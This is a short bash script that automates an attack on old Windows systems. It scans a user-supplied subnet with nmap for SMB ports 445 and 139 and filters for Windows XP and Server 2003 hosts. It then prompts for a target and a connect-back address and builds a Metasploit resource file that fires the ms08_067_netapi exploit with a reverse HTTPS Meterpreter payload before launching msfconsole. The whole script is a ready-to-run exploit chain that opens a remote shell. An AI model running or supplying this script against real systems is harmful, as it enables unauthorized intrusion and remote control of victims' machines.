#!/bin/bash
read -p $'\e[1;32mEnter the ip and subnet ex. 10.0.0.0/24:\e[0m ' ipsubnet
echo -e "\e[1;31mScanning for ports 445 and 139\e[m"
scan=$(sudo nmap $ipsubnet -O -p 445,139)
ports=$(echo "$scan" | grep -E -B 3 -A 7 '445/tcp open|139/tcp open' | grep -E -B 8 'Microsoft Windows XP|Microsoft Windows Server 2003') 
echo "$ports"
#echo $scan
read -p 'Is there a target to attack? Press y:' attack
if [ "$attack" = "y" ]; then
	read -p $'\e[1;31mTarget IP address:\e[m' rhost
	read -p $'\e[1;31mWhich port is the service running on?:\e[m' rport
	read -p $'\e[1;31mWhich ip would you like to connect back too?:\e[m' lhost
	read -p $'\e[1;31mWhich port would you like to connect back on?:\e[m' lport
	sudo service postgresql start
	echo -e "use exploit/windows/smb/ms08_067_netapi\nset RHOST $rhost\nset RPORT $rport\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST $lhost\nset LPORT $lport\nset ExitOnSession false" > windowsxp.rc
	msfconsole -q -r windowsxp.rc

else
	exit
fi
# 445 and 139
